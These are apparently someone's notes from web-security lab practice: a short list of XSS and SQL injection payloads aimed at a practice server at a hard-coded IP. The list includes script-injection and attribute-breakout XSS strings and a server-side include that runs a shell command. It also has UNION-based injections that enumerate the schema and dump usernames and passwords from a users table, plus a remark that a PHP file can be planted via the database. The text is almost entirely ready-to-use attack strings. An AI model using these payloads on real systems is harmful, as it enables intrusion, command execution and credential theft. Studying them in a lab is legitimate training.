# SQL_XSS

XSS
<script>alert('blabla')</script>

#open a cmd and entre a command on a server using a injiection
 <! --#exec cmd="ls ../" -->  #drop the space

92.60.14.134:8081/xss/iframe3?path=asdfasdf" onload="alert('blabla')

http://92.60.14.134:8081/xss/jsvar1?count=99%22);alert(2);//

http://92.60.14.134:8081/xss/jsvar2?count=33);%3C/script%3E%3Cscript%3Ealert(2)%3C/script%3E

SQL Injection:
105 ' or 1=1 -- -'

http://92.60.14.134:8081/sql/1?category=animal' Union select @@version, null;-- -

Alles auszeigen lassen:
http://92.60.14.134:8081/sql/1?category=animal' Union select table_schema, table_name from 

information_schema.tables;-- -

http://92.60.14.134:8081/sql/1?category=animal' Union select table_name, column_name from 

information_schema.columns ;-- -

http://92.60.14.134:8081/sql/1?category=animal' UNION SELECT user_name,user_password FROM users;-- -

Wenn Datenbank im Root verzeichnis lauft, dann kann ein PHP file eingespielt werden.
